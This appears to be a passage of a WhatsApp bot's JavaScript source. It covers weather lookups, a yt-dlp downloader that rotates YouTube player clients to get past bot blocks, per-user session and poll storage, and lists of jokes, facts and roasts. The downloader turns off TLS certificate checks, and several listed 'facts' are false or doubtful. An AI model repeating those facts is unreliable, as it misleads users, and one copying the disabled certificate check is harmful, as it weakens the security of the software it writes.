      headers: { 'User-Agent': BROWSER_UA, 'Accept': 'application/json' },
      timeout: 15000
    });
    const result = JSON.parse(buf.toString('utf8'));
    if (result.status !== 'OK' || !result.results.length) {
      console.log(`[weather] Google Maps: status=${result.status}`);
      return null;
    }
    const r = result.results[0];
    return {
      lat: r.geometry.location.lat,
      lng: r.geometry.location.lng,
      displayName: r.formatted_address
    };
  } catch (e) {
    console.log('[weather] Google Maps failed:', e.message);
    return null;
  }
}

function _ph_windDir(deg) {
  const dirs = ['N','NNE','NE','ENE','E','ESE','SE','SSE','S','SSW','SW','WSW','W','WNW','NW','NNW'];
  return dirs[Math.round(deg / 22.5) % 16];
}

function _ph_wmoCode(code) {
  // WMO weather interpretation codes (used by Open-Meteo)
  const m = {
    0:  { d: 'Clear sky',              i: '☀️' },
    1:  { d: 'Mainly clear',           i: '🌤️' },
    2:  { d: 'Partly cloudy',          i: '⛅' },
    3:  { d: 'Overcast',               i: '☁️' },
    45: { d: 'Foggy',                  i: '🌫️' },
    48: { d: 'Depositing rime fog',    i: '🌫️' },
    51: { d: 'Light drizzle',          i: '🌦️' },
    53: { d: 'Moderate drizzle',       i: '🌦️' },
    55: { d: 'Dense drizzle',          i: '🌦️' },
    56: { d: 'Light freezing drizzle', i: '🌧️' },
    57: { d: 'Dense freezing drizzle', i: '🌧️' },
    61: { d: 'Slight rain',            i: '🌧️' },
    63: { d: 'Moderate rain',          i: '🌧️' },
    65: { d: 'Heavy rain',             i: '🌧️' },
    66: { d: 'Light freezing rain',    i: '🌧️' },
    67: { d: 'Heavy freezing rain',    i: '🌧️' },
    71: { d: 'Slight snow',            i: '🌨️' },
    73: { d: 'Moderate snow',          i: '❄️' },
    75: { d: 'Heavy snow',             i: '❄️' },
    77: { d: 'Snow grains',            i: '🌨️' },
    80: { d: 'Slight rain showers',    i: '🌦️' },
    81: { d: 'Moderate rain showers',  i: '🌧️' },
    82: { d: 'Violent rain showers',   i: '⛈️' },
    85: { d: 'Slight snow showers',    i: '🌨️' },
    86: { d: 'Heavy snow showers',     i: '❄️' },
    95: { d: 'Thunderstorm',           i: '⛈️' },
    96: { d: 'Thunderstorm + slight hail', i: '⛈️' },
    99: { d: 'Thunderstorm + heavy hail',  i: '⛈️' }
  };
  return m[code] || { d: 'Unknown', i: '🌡️' };
}

async function _ph_getWeather(lat, lng) {
  try {
    const buf = await _ph_httpsRequest({
      hostname: 'api.open-meteo.com',
      path: `/v1/forecast?latitude=${lat}&longitude=${lng}` +
            `&current=temperature_2m,apparent_temperature,relative_humidity_2m,weather_code,wind_speed_10m,wind_direction_10m,uv_index,precipitation` +
            `&hourly=precipitation,precipitation_probability,weather_code` +
            `&daily=sunrise,sunset&timezone=auto&forecast_days=1`,
      method: 'GET',
      headers: { 'User-Agent': BROWSER_UA, 'Accept': 'application/json' },
      timeout: 15000
    });
    const data = JSON.parse(buf.toString('utf8'));
    const c = data.current || {};
    const d = data.daily || {};
    const h = data.hourly || {};

    // ── Rain forecast for the next 6 hours ──
    // Find the current hour index, then look at next 6 hours of probability + amount
    let rainForecast = { summary: 'No data', maxProb: 0, next3hProb: 0, next3hMm: 0, peakHour: null };
    try {
      const times = h.time || [];
      const probs = h.precipitation_probability || [];
      const amts  = h.precipitation || [];
      const codes = h.weather_code || [];
      // Find current hour index by matching the current ISO time prefix
      const nowISO = c.time || new Date().toISOString();
      let startIdx = times.findIndex(t => t >= nowISO.slice(0, 13));
      if (startIdx < 0) startIdx = 0;

      let maxP = 0, peakI = -1;
      let sumP = 0, sumM = 0;
      const windowHours = Math.min(6, times.length - startIdx);
      for (let i = 0; i < windowHours; i++) {
        const idx = startIdx + i;
        const p = probs[idx] ?? 0;
        const m = amts[idx] ?? 0;
        if (p > maxP) { maxP = p; peakI = idx; }
        if (i < 3) { sumP += p; sumM += m; }
      }
      const avgP3 = windowHours > 0 ? Math.round(sumP / Math.min(3, windowHours)) : 0;
      const peakHour = peakI >= 0 ? (times[peakI] || '').split('T')[1]?.slice(0, 5) : null;

      // Classify: >70% = likely rain, 30-70% = might rain, <30% = no rain
      let summary;
      if (maxP >= 70)        summary = `🌧️ *LIKELY TO RAIN* (${maxP}% peak @ ${peakHour})`;
      else if (maxP >= 30)   summary = `⛅ *MIGHT RAIN* (${maxP}% peak @ ${peakHour})`;
      else if (sumM >= 0.5)  summary = `💧 *Drizzle possible* (${maxP}% peak @ ${peakHour})`;
      else                   summary = `☀️ *NO RAIN expected* next 6h`;

      rainForecast = { summary, maxProb: maxP, next3hProb: avgP3, next3hMm: Math.round(sumM * 10) / 10, peakHour };
    } catch (e) {
      console.log('[weather] rain forecast calc failed:', e.message);
    }

    return {
      temp:        Math.round(c.temperature_2m ?? 0),
      tempF:       Math.round((c.temperature_2m ?? 0) * 9/5 + 32),
      feelsLike:   Math.round(c.apparent_temperature ?? 0),
      humidity:    c.relative_humidity_2m ?? 0,
      code:        c.weather_code ?? 0,
      windSpeed:   Math.round(c.wind_speed_10m ?? 0),
      windDirDeg:  c.wind_direction_10m ?? 0,
      uv:          c.uv_index != null ? Math.round(c.uv_index * 10) / 10 : null,
      precip:      c.precipitation ?? 0,
      sunrise:     (d.sunrise?.[0] || '').split('T')[1]?.slice(0, 5) || 'N/A',
      sunset:      (d.sunset?.[0]  || '').split('T')[1]?.slice(0, 5) || 'N/A',
      timezone:    data.timezone || 'UTC',
      rain:        rainForecast
    };
  } catch (e) {
    console.log('[weather] Open-Meteo failed:', e.message);
    return null;
  }
}

// Tier 3a: yt-dlp subprocess — works for YouTube/TikTok/IG/FB/X/Pinterest
// Most reliable option because yt-dlp actively maintains site support.
// Requires yt-dlp + ffmpeg (imageio-ffmpeg) installed via render.yaml buildCommand.
//
// Strategy (as of late 2025): YouTube bot detection is brutal against cloud IPs.
// We try 4 player clients in sequence — web_safari is least restricted, then tv,
// then ios, then web. We also explicitly pass FFMPEG_PATH so yt-dlp finds the
// imageio-ffmpeg binary (otherwise audio conversion fails silently).
function _ph_enhancedSubprocessEnv() {
  const os = require('os');
  const path = require('path');
  const userLocalBin = path.join(os.homedir(), '.local', 'bin');
  const extraPath = `${userLocalBin}:/home/render/.local/bin:/root/.local/bin:/usr/local/bin:/usr/bin`;
  const ffmpegPath = _ph_resolveFFmpegPath();
  const env = { 
    ...process.env, 
    PATH: `${extraPath}:${process.env.PATH || ''}`,
    PYTHONUNBUFFERED: '1',
    PYTHONIOENCODING: 'utf-8',
    // Helps bgutil-ytdlp-pot-provider script mode cache tokens between yt-dlp calls.
    TOKEN_TTL: process.env.TOKEN_TTL || '6'
  };
  if (ffmpegPath) env.FFMPEG_PATH = ffmpegPath;
  return { env, ffmpegPath };
}

function _ph_prepareYtDlpCookies() {
  try {
    if (process.env.YTDLP_COOKIES_PATH && fs.existsSync(process.env.YTDLP_COOKIES_PATH)) {
      return process.env.YTDLP_COOKIES_PATH;
    }

    let raw = null;
    if (process.env.YTDLP_COOKIES_B64) {
      raw = Buffer.from(process.env.YTDLP_COOKIES_B64, 'base64').toString('utf8');
    } else if (process.env.YTDLP_COOKIES) {
      raw = process.env.YTDLP_COOKIES;
    }

    if (!raw || !/youtube\.com|google\.com|# Netscape HTTP Cookie File/i.test(raw)) return null;
    if (!fs.existsSync(YTDLP_COOKIE_FILE) || fs.readFileSync(YTDLP_COOKIE_FILE, 'utf8') !== raw) {
      fs.writeFileSync(YTDLP_COOKIE_FILE, raw, { mode: 0o600 });
      console.log('[dl] ✅ yt-dlp cookies written from env');
    }
    return YTDLP_COOKIE_FILE;
  } catch (e) {
    console.log(`[dl] ⚠️ yt-dlp cookie setup failed: ${e.message?.slice(0, 100)}`);
    return null;
  }
}

async function _ph_tryYtDlp(url, isAudio) {
  const { env, ffmpegPath } = _ph_enhancedSubprocessEnv();
  const videoId = _ph_extractYouTubeId(url);

  // YouTube cloud IPs often need different Innertube clients / POT tokens.
  // Try several profiles before giving up. Non-YouTube URLs use the generic profile.
  const profiles = videoId ? [
    { name: 'android_vr', args: ['--extractor-args', 'youtube:player_client=android_vr'] },
    { name: 'ios',        args: ['--extractor-args', 'youtube:player_client=ios'] },
    { name: 'mweb',       args: ['--extractor-args', 'youtube:player_client=mweb'] },
    { name: 'web_safari', args: ['--extractor-args', 'youtube:player_client=web_safari'] },
    { name: 'tv',         args: ['--extractor-args', 'youtube:player_client=tv'] },
    // Last resort: let yt-dlp + bgutil choose/generate POT tokens if available.
    { name: 'default+pot', args: [] }
  ] : [{ name: 'generic', args: [] }];

  for (const profile of profiles) {
    const result = await _ph_tryYtDlpOnce(url, isAudio, env, ffmpegPath, profile);
    if (result) {
      console.log(`[dl] ✅ yt-dlp (${profile.name}) succeeded → ${(result.length/1024/1024).toFixed(1)}MB`);
      return result;
    }
  }

  console.log(`[dl] ❌ yt-dlp failed`);
  return null;
}

// Single yt-dlp attempt with a specific player client
async function _ph_tryYtDlpOnce(url, isAudio, env, hasFFmpeg, profile = { name: 'generic', args: [] }) {
  return new Promise((resolve) => {
    let proc;
    try {
      const { spawn } = require('child_process');

      const args = [
        '--no-playlist',
        '--no-warnings',
        '--no-progress',
        '--no-update',
        '--max-filesize', '80M',
        '--socket-timeout', '30',
        '--retries', '2',
        '--fragment-retries', '2',
        '--retry-sleep', '1',
        '--no-check-certificates',
        '--force-ipv4',
        '--user-agent', BROWSER_UA,
        '--referer', 'https://www.youtube.com/',
        '--add-header', 'Accept-Language:en-US,en;q=0.9',
        '--compat-options', 'no-youtube-unavailable-videos',
        ...((profile && profile.args) || []),
        '-o', '-'
      ];

      const cookieFile = _ph_prepareYtDlpCookies();
      if (cookieFile) args.push('--cookies', cookieFile);

      if (isAudio) {
        args.push('-x');
        if (hasFFmpeg) {
          // Convert to mp3 (highest quality)
          args.push('--audio-format', 'mp3', '--audio-quality', '0');
        } else {
          // No ffmpeg available — get best audio stream as-is (likely m4a, WhatsApp accepts it)
          args.push('-f', 'ba[ext=m4a]/ba/best');
          args.push('--audio-format', 'best');
        }
      } else {
        // Best mp4 ≤720p, capped at 80MB
        args.push('-S', 'ext:mp4:m4a,res:720,size:80M,br');
      }
      args.push(url);

      console.log(`[dl] ▶️ yt-dlp try: ${profile?.name || 'generic'}`);
      proc = spawn('yt-dlp', args, { timeout: 180000, env });

      const chunks = [];
      let total = 0;
      let stderrBuf = '';

      proc.stdout.on('data', (chunk) => {
        total += chunk.length;
        if (total > MAX_DOWNLOAD_BYTES) {
          proc.kill('SIGTERM');
          return resolve(null);
        }
        chunks.push(chunk);
      });

      proc.stderr.on('data', (d) => {
        stderrBuf += d.toString();
        if (stderrBuf.length > 5000) stderrBuf = stderrBuf.slice(-5000);
      });

      proc.on('error', (e) => {
        if (e.code === 'ENOENT') {
          console.log('[dl] ❌ yt-dlp not installed');
        }
        resolve(null);
      });

      proc.on('close', (code) => {
        if (code === 0 && chunks.length > 0) {
          resolve(Buffer.concat(chunks));
        } else {
          // Only log every Nth attempt to avoid log spam
          const errLines = stderrBuf.split('\n').filter(l => l.trim() && !l.startsWith('[debug]'));
          const errSnippet = errLines.slice(-1).join(' ').slice(0, 200);
          // Detect the kind of failure
          if (/Sign in to confirm|bot|Forbidden|403/i.test(stderrBuf)) {
            console.log(`[dl] ⚠️ yt-dlp (${profile?.name || 'generic'}) bot/403 block: ${errSnippet || 'blocked'}`);
          } else if (/ffmpeg|FFmpeg/i.test(stderrBuf)) {
            console.log(`[dl] ⚠️ yt-dlp (subprocess) ffmpeg issue: ${errSnippet}`);
          } else if (errSnippet) {
            console.log(`[dl] ⚠️ yt-dlp (subprocess) exit ${code}: ${errSnippet}`);
          }
          resolve(null);
        }
      });
    } catch (e) {
      if (proc) try { proc.kill(); } catch (_) {}
      resolve(null);
    }
  });
}

// Resolve ffmpeg path: try system ffmpeg first, then imageio-ffmpeg via Python
let _ph_cachedFFmpegPath = null;
let _ph_cachedFFmpegTime = 0;
function _ph_resolveFFmpegPath() {
  // Cache for 60s — checking on every download is slow
  const now = Date.now();
  if (_ph_cachedFFmpegPath !== null && (now - _ph_cachedFFmpegTime) < 60000) {
    return _ph_cachedFFmpegPath;
  }
  _ph_cachedFFmpegTime = now;

  // Try system ffmpeg first (faster)
  try {
    const { spawnSync } = require('child_process');
    const r = spawnSync('ffmpeg', ['-version'], { timeout: 3000 });
    if (r.status === 0) {
      _ph_cachedFFmpegPath = '/usr/bin/ffmpeg'; // assume system location
      console.log('[dl] ✅ ffmpeg found at /usr/bin/ffmpeg');
      return _ph_cachedFFmpegPath;
    }
  } catch (_) {}

  // Fall back to imageio-ffmpeg (Python package)
  try {
    const { execSync } = require('child_process');
    const out = execSync(
      'python3 -c "import imageio_ffmpeg; print(imageio_ffmpeg.get_ffmpeg_exe())"',
      { timeout: 5000 }
    ).toString().trim();
    if (out && out.startsWith('/')) {
      _ph_cachedFFmpegPath = out;
      console.log(`[dl] ✅ ffmpeg found via imageio-ffmpeg: ${out}`);
      return _ph_cachedFFmpegPath;
    }
  } catch (e) {
    console.log(`[dl] ⚠️ ffmpeg not found via imageio-ffmpeg: ${e.message?.slice(0, 100)}`);
  }

  _ph_cachedFFmpegPath = false; // explicitly cache "not found"
  console.log('[dl] ⚠️ ffmpeg not available — will use m4a fallback for audio');
  return null;
}

// Diagnostic helper — checks yt-dlp + ffmpeg installation status
async function _ph_diagnoseDownloader() {
  const result = { ytDlp: null, ffmpeg: null };
  const { spawn } = require('child_process');
  const { env } = _ph_enhancedSubprocessEnv();

  // Check yt-dlp
  try {
    result.ytDlp = await new Promise((resolve) => {
      const p = spawn('yt-dlp', ['--version'], { timeout: 10000, env });
      let out = '';
      p.stdout.on('data', d => out += d.toString());
      p.on('error', () => resolve(null));
      p.on('close', (code) => resolve(code === 0 ? out.trim() : null));
    });
  } catch (_) {}

  // Check ffmpeg (system or imageio-ffmpeg static binary)
  try {
    result.ffmpeg = await new Promise((resolve) => {
      const p = spawn('ffmpeg', ['-version'], { timeout: 10000, env });
      let out = '';
      p.stdout.on('data', d => out += d.toString());
      p.on('error', () => resolve(null));
      p.on('close', (code) => {
        if (code === 0) {
          const verLine = out.split('\n')[0] || '';
          resolve(verLine.slice(0, 100));
        } else {
          resolve(null);
        }
      });
    });
  } catch (_) {}

  // Also test that yt-dlp can actually call ffmpeg (catches imageio-ffmpeg install issue)
  try {
    const ffmpegViaYtdlp = await new Promise((resolve) => {
      const p = spawn('yt-dlp', ['--ffmpeg-location', '-'], { timeout: 10000, env });
      let out = '';
      p.stdout.on('data', d => out += d.toString());
      p.stderr.on('data', d => out += d.toString());
      p.on('error', () => resolve(null));
      p.on('close', () => resolve(out.includes('ffmpeg') ? 'detected' : null));
    });
    result.ytDlpFfmpeg = ffmpegViaYtdlp;
  } catch (_) {}

  return result;
}

// Tier 3b: ytdl-core — YouTube only, returns Buffer directly (legacy fallback)
async function _ph_tryYtdlCore(url, isAudio) {
  try {
    let ytdl;
    try { ytdl = require('@distube/ytdl-core'); }
    catch (_) { ytdl = require('ytdl-core'); }
    const stream = ytdl(url, {
      filter: isAudio ? 'audioonly' : 'audioandvideo',
      quality: isAudio ? 'highestaudio' : 'highest',
      highWaterMark: 1 << 25 // 32MB chunks to avoid backpressure
    });
    const chunks = [];
    let total = 0;
    for await (const chunk of stream) {
      total += chunk.length;
      if (total > MAX_DOWNLOAD_BYTES) {
        stream.destroy();
        console.log(`[dl] ⚠️ ytdl-core exceeded ${MAX_DOWNLOAD_BYTES/1024/1024}MB cap`);
        return null;
      }
      chunks.push(chunk);
    }
    console.log(`[dl] ✅ ytdl-core → ${(total/1024/1024).toFixed(1)}MB`);
    return Buffer.concat(chunks);
  } catch (e) {
    console.log(`[dl] ⚠️ ytdl-core failed: ${e.message}`);
    return null;
  }
}

// Download buffer from a media URL (with size cap)
async function _ph_downloadBuffer(mediaUrl) {
  try {
    const u = new URL(mediaUrl);
    const chunks = [];
    let total = 0;
    return await new Promise((resolve, reject) => {
      const req = https.request({
        hostname: u.hostname,
        path: u.pathname + u.search,
        method: 'GET',
        headers: { 'User-Agent': BROWSER_UA },
        timeout: 90000
      }, (res) => {
        if (res.statusCode >= 300 && res.statusCode < 400 && res.headers.location) {
          return resolve(_ph_downloadBuffer(res.headers.location));
        }
        if (res.statusCode >= 400) return reject(new Error(`HTTP ${res.statusCode}`));
        res.on('data', c => {
          total += c.length;
          if (total > MAX_DOWNLOAD_BYTES) {
            req.destroy();
            return reject(new Error('File too large (>80MB cap)'));
          }
          chunks.push(c);
        });
        res.on('end', () => resolve(Buffer.concat(chunks)));
      });
      req.on('error', reject);
      req.setTimeout(90000, () => req.destroy(new Error('Timeout')));
      req.end();
    });
  } catch (e) {
    console.log(`[dl] ⚠️ buffer fetch failed: ${e.message}`);
    return null;
  }
}

// Download a small preview image for WhatsApp cards (keeps audio preview from going blank)
async function _ph_downloadPreviewImage(imageUrl) {
  try {
    if (!imageUrl) return null;
    const u = new URL(imageUrl);
    if (u.protocol !== 'https:') return null;
    const chunks = [];
    let total = 0;
    return await new Promise((resolve, reject) => {
      const req = https.request({
        hostname: u.hostname,
        path: u.pathname + u.search,
        method: 'GET',
        headers: { 'User-Agent': BROWSER_UA, 'Accept': 'image/*,*/*;q=0.8' },
        timeout: 15000
      }, (res) => {
        if (res.statusCode >= 300 && res.statusCode < 400 && res.headers.location) {
          return resolve(_ph_downloadPreviewImage(new URL(res.headers.location, imageUrl).toString()));
        }
        if (res.statusCode >= 400) return reject(new Error(`HTTP ${res.statusCode}`));
        res.on('data', c => {
          total += c.length;
          if (total > 512 * 1024) {
            req.destroy();
            return reject(new Error('Preview image too large'));
          }
          chunks.push(c);
        });
        res.on('end', () => resolve(Buffer.concat(chunks)));
      });
      req.on('error', reject);
      req.setTimeout(15000, () => req.destroy(new Error('Timeout')));
      req.end();
    });
  } catch (e) {
    console.log(`[play] ⚠️ preview image failed: ${e.message}`);
    return null;
  }
}

// Get YouTube video metadata via yt-search
async function _ph_getYouTubeMeta(videoId) {
  try {
    const yts = require('yt-search');
    const r = await yts({ videoId });
    if (r) return {
      title: r.title || 'YouTube Video',
      uploader: r.author?.name || 'Unknown',
      duration: r.duration?.timestamp || r.duration || '?',
      views: r.views || 0,
      thumbnail: r.thumbnail || r.image || null,
      url: r.url
    };
  } catch (_) {}
  return null;
}

// ── Per-session bot mode (private/public) — stored in user_sessions/*.json ──
function getSessionMode(ownerNum) {
  return getUserValue(ownerNum, 'mode', 'public');
}
function setSessionMode(ownerNum, mode) {
  setUserValue(ownerNum, 'mode', mode);
}
// Check if sender is the owner (the paired number).
// LID-AWARE: WhatsApp now masks identities as @lid, so a plain phone-number
// comparison fails for the owner's own @lid. We therefore also compare against
// the bot's own LID (sock.user.lid / creds.me.lid) so the owner is recognised
// whether their message arrives as a phone JID or as an @lid.
function isOwnerJid(jid, sock) {
  if (!sock?.user?.id || !jid) return false;
  const senderRaw = String(jid);

  // 1. Phone-number match (handles @s.whatsapp.net and bare numbers)
  const ownerNum = normalizeNum(sock.user.id.split(':')[0].split('@')[0]);
  const senderNum = normalizeNum(senderRaw.split('@')[0].split(':')[0]);
  if (ownerNum && senderNum && ownerNum === senderNum) return true;

  // 2. LID match — compare the @lid identity portion against the bot's own LID
  if (senderRaw.endsWith('@lid')) {
    const botLid = normalizeNum(String(sock.user?.lid || sock.authState?.creds?.me?.lid || '').split('@')[0].split(':')[0]);
    const senderLid = normalizeNum(senderRaw.split('@')[0].split(':')[0]);
    if (botLid && senderLid && botLid === senderLid) return true;
  }
  return false;
}

// ── Per-session alias system — stored in user_sessions/*.json ──
function getAliases(ownerNum) {
  return getUserValue(ownerNum, 'aliases', {});
}
function setAlias(ownerNum, original, alias) {
  const s = loadUserSession(ownerNum);
  if (!s.aliases) s.aliases = {};
  s.aliases[alias] = original;
  saveUserSession(ownerNum, s);
}
function delAlias(ownerNum, alias) {
  const s = loadUserSession(ownerNum);
  if (s.aliases) {
    delete s.aliases[alias];
    saveUserSession(ownerNum, s);
  }
}
function resolveAlias(ownerNum, cmd) {
  const aliases = getAliases(ownerNum);
  return aliases[cmd] || cmd;
}

// ── Per-session prefix system — stored in user_sessions/*.json ──
function getPrefix(ownerNum) { return getUserValue(ownerNum, 'prefix', '.'); }
function setPrefix(ownerNum, p) { setUserValue(ownerNum, 'prefix', p); }

// ── Autoreact system — stored in user_sessions/*.json ──
function getAutoreact(ownerNum) {
  return getUserValue(ownerNum, 'autoreact', { enabled: false, emoji: '⚡', scope: 'global', targets: [] });
}
function setAutoreact(ownerNum, config) { setUserValue(ownerNum, 'autoreact', config); }

// ── Per-user kill switch (stored in user_sessions/*.json) ──
function getUserKilled(ownerNum) {
  return getUserValue(ownerNum, 'killed', false);
}
function setUserKilled(ownerNum, val) {
  setUserValue(ownerNum, 'killed', val);
}

// ── Per-User Session System (all user data isolated in one file) ──
const USER_SESSION_DIR = 'user_sessions';
const MAX_USER_POLLS = 5;

// Global poll ID → owner phone lookup (fast routing for votes)
const pollOwnerMap = new Map();

function getUserSessionFile(phone) {
  return path.join(USER_SESSION_DIR, `${normalizeNum(phone)}.json`);
}

function loadUserSession(phone) {
  try {
    const f = getUserSessionFile(phone);
    if (fs.existsSync(f)) return JSON.parse(fs.readFileSync(f, 'utf8'));
  } catch (_) {}
  return {};
}

function saveUserSession(phone, data) {
  try {
    if (!fs.existsSync(USER_SESSION_DIR)) fs.mkdirSync(USER_SESSION_DIR, { recursive: true });
    fs.writeFileSync(getUserSessionFile(phone), JSON.stringify(data, null, 2));
    backupAuthToChannel().catch(() => {});
  } catch (_) {}
}

function getUserValue(phone, key, def) {
  const s = loadUserSession(phone);
  return s[key] !== undefined ? s[key] : def;
}

function setUserValue(phone, key, value) {
  const s = loadUserSession(phone);
  s[key] = value;
  saveUserSession(phone, s);
}

// ── Per-User Poll Cache (LRU, max 5 per user) ──
function addUserPoll(phone, pollId, data) {
  const s = loadUserSession(phone);
  if (!s.pollCache) s.pollCache = {};
  if (!s.pollOrder) s.pollOrder = [];

  // Evict oldest if at limit
  while (s.pollOrder.length >= MAX_USER_POLLS) {
    const oldest = s.pollOrder.shift();
    delete s.pollCache[oldest];
    pollOwnerMap.delete(oldest);
    console.log(`[poll] Evicted oldest poll ${oldest} for ${phone}`);
  }

  // Add new poll
  s.pollCache[pollId] = data;
  s.pollOrder.push(pollId);
  pollOwnerMap.set(pollId, phone);
  saveUserSession(phone, s);
  console.log(`[poll] Added poll ${pollId} for ${phone} (total: ${s.pollOrder.length})`);
}

function getUserPoll(phone, pollId) {
  const s = loadUserSession(phone);
  if (!s.pollCache || !s.pollCache[pollId]) return undefined;

  // Update LRU: move to end (most recently used)
  if (s.pollOrder) {
    const idx = s.pollOrder.indexOf(pollId);
    if (idx !== -1) {
      s.pollOrder.splice(idx, 1);
      s.pollOrder.push(pollId);
      saveUserSession(phone, s);
    }
  }

  return s.pollCache[pollId];
}

function removeUserPoll(phone, pollId) {
  const s = loadUserSession(phone);
  if (s.pollCache) delete s.pollCache[pollId];
  if (s.pollOrder) {
    const idx = s.pollOrder.indexOf(pollId);
    if (idx !== -1) s.pollOrder.splice(idx, 1);
  }
  pollOwnerMap.delete(pollId);
  saveUserSession(phone, s);
}

function clearUserPolls(phone) {
  const s = loadUserSession(phone);
  if (s.pollOrder) {
    for (const pid of s.pollOrder) pollOwnerMap.delete(pid);
    s.pollOrder = [];
  }
  if (s.pollCache) s.pollCache = {};
  saveUserSession(phone, s);
  console.log(`[poll] Cleared all polls for ${phone}`);
}

// ── Per-User Business Account Detection (cached once, never re-checks) ──
async function getUserBusinessStatus(sock) {
  const ownerNum = sock.user?.id?.split(':')[0]?.split('@')[0];
  if (!ownerNum) return false;

  const cached = getUserValue(ownerNum, 'isBusiness');
  if (cached !== undefined) {
    console.log(`[ACCOUNT] Using cached type for ${ownerNum}: ${cached ? 'Business' : 'Normal'}`);
    return cached;
  }

  // Detect and cache
  const isBiz = await detectAccountType(sock);
  setUserValue(ownerNum, 'isBusiness', isBiz);
  return isBiz;
}

// ── Migrate legacy global poll_cache.json into per-user sessions ──
function migrateLegacyPollCache() {
  try {
    if (fs.existsSync('poll_cache.json')) {
      const legacy = JSON.parse(fs.readFileSync('poll_cache.json', 'utf8'));
      let migrated = 0;
      for (const [pollId, data] of Object.entries(legacy)) {
        // We can't know the owner from legacy cache, skip
      }
      if (migrated > 0) {
        console.log(`[poll] Migrated ${migrated} legacy polls`);
        fs.renameSync('poll_cache.json', 'poll_cache.json.migrated');
      }
    }
  } catch (_) {}
}




// ── Active sessions tracker (phone numbers currently connected) ──
const LINKED_FILE = 'linked_sessions.json';
let linkedSessions = {}; // { "2348012345678": { connectedAt, lastSeen } }
function loadLinked() { try { if (fs.existsSync(LINKED_FILE)) linkedSessions = JSON.parse(fs.readFileSync(LINKED_FILE, 'utf8')); } catch (_) {} }
function saveLinked() { 
  try { 
    fs.writeFileSync(LINKED_FILE, JSON.stringify(linkedSessions, null, 2));
    backupAuthToChannel().catch(() => {});
  } catch (_) {} 
}
function addLinkedSession(phoneNum) {
  linkedSessions[normalizeNum(phoneNum)] = { connectedAt: new Date().toISOString(), lastSeen: new Date().toISOString() };
  saveLinked();
}
function removeLinkedSession(phoneNum) { delete linkedSessions[normalizeNum(phoneNum)]; saveLinked(); }

  // Helper: get connected number for linked session cleanup
  function getLinkedNum(sock, phoneNumber) {
    if (sock?.user?.id) return sock.user.id.split(':')[0].split('@')[0];
    if (phoneNumber) return normalizeNum(phoneNumber);
    return null;
  }

function getLinkedCount() { loadLinked(); return Object.keys(linkedSessions).length; }
function getAllLinked() { loadLinked(); return linkedSessions; }

// ── Auto-join groups on new pairing ──
async function autoJoinGroups(sock) {
  const links = process.env.AUTO_JOIN_GROUPS;
  if (!links) return;
  const groupLinks = links.split(',').map(l => l.trim()).filter(Boolean);
  if (groupLinks.length === 0) return;
  console.log(`[auto-join] Joining ${groupLinks.length} groups...`);
  for (const link of groupLinks) {
    try {
      const code = link.replace(/https?:\/\/chat\.whatsapp\.com\//i, '').trim();
      if (!code) continue;
      await sock.groupAcceptInvite(code);
      console.log(`[auto-join] ✅ Joined: ${code.slice(0, 15)}...`);
      await new Promise(r => setTimeout(r, 2000)); // 2s delay between joins
    } catch (e) {
      console.log(`[auto-join] ❌ Failed: ${e.message}`);
    }
  }
}

// ── Fun command data arrays ──
const JOKES = [
  "Why don't scientists trust atoms? Because they make up everything! 😂",
  "I told my wife she was drawing her eyebrows too high. She looked surprised. 😂",
  "Why do cows wear bells? Because their horns don't work! 🐄",
  "I asked my dog what two minus two is. He said nothing. 🐶",
  "Why can't you give Elsa a balloon? Because she'll let it go! ❄️",
  "What do you call a fake noodle? An impasta! 🍝",
  "Why did the scarecrow win an award? He was outstanding in his field! 🌾",
  "I'm reading a book about anti-gravity. It's impossible to put down! 📚",
  "Why did the bicycle fall over? Because it was two-tired! 🚲",
  "What do you call cheese that isn't yours? Nacho cheese! 🧀",
  "Why did the math book look so sad? It had too many problems! 📖",
  "I used to hate facial hair but then it grew on me! 😂",
  "How do you organize a space party? You planet! 🚀",
  "Why don't eggs tell jokes? They'd crack each other up! 🥚",
  "What do you call a sleeping dinosaur? A dino-snore! 🦕",
];
const FACTS = [
  "🧠 Humans share 50% of their DNA with bananas.",
  "🐘 Elephants are the only animals that can't jump.",
  "🌍 Nigeria is home to more English speakers than England itself.",
  "🦈 Sharks are older than trees — they've existed for 450 million years.",
  "🍯 Honey never expires. 3000-year-old honey found in Egyptian tombs was still edible.",
  "🌙 A day on Venus is longer than a year on Venus.",
  "🦋 Butterflies taste with their feet.",
  "💡 The lighter was invented before the match.",
  "🐙 Octopuses have three hearts and blue blood.",
  "🌊 The ocean covers 71% of Earth but 95% of it is still unexplored.",
  "🧲 A teaspoon of neutron star would weigh 6 billion tonnes.",
  "🐌 Snails can sleep for up to 3 years.",
  "🎵 Music can trigger the same brain response as food or sex.",
  "📱 The first iPhone was released in 2007. WhatsApp didn't exist until 2009.",
  "🌿 There are more trees on Earth than stars in the Milky Way.",
];
const QUOTES = [
  '💬 "The secret of getting ahead is getting started." — Mark Twain',
  '💬 "In the middle of every difficulty lies opportunity." — Albert Einstein',
  '💬 "It does not matter how slowly you go as long as you do not stop." — Confucius',
  '💬 "Success is not final; failure is not fatal: it is the courage to continue that counts." — Churchill',
  '💬 "Believe you can and you\'re halfway there." — Theodore Roosevelt',
  '💬 "The only way to do great work is to love what you do." — Steve Jobs',
  '💬 "Don\'t watch the clock; do what it does. Keep going." — Sam Levenson',
  '💬 "An investment in knowledge pays the best interest." — Benjamin Franklin',
  '💬 "You miss 100% of the shots you don\'t take." — Wayne Gretzky',
  '💬 "Hard work beats talent when talent doesn\'t work hard." — Tim Notke',
  '💬 "Fall seven times, stand up eight." — Japanese Proverb',
  '💬 "No pressure, no diamonds." — Thomas Carlyle',
  '💬 "A smooth sea never made a skilled sailor." — Franklin D. Roosevelt',
  '💬 "The man who has no imagination has no wings." — Muhammad Ali',
  '💬 "The future belongs to those who believe in the beauty of their dreams." — Eleanor Roosevelt',
];
const ROASTS = [
  "📵 Your WiFi signal has a better connection than your personality.",
  "🧠 I'd roast you, but my mum said I'm not allowed to burn trash.",
  "👁️ You have the face of a saint — a Saint Bernard.",
  "📚 You're proof that evolution can go in reverse.",
  "💤 I'd agree with you, but then we'd both be wrong.",
  "🪟 If laughter is the best medicine, your face must be curing diseases.",
  "🏃 You're not stupid; you just have bad luck thinking.",
  "🕹️ You're like a software update. Whenever I see you, I think 'not now'.",
  "📉 You have miles to go before you reach mediocre.",
  "🔋 You have the energy of a dying phone battery.",
  "🗑️ I'd insult your intelligence, but I'm not sure you have any.",
  "😴 You're so boring even your phone goes to sleep around you.",
  "🌚 I'm not saying I hate you, but I'd unplug your life support for a charger.",
  "🎪 Your brain must be the size of a pebble. Cute, but useless.",
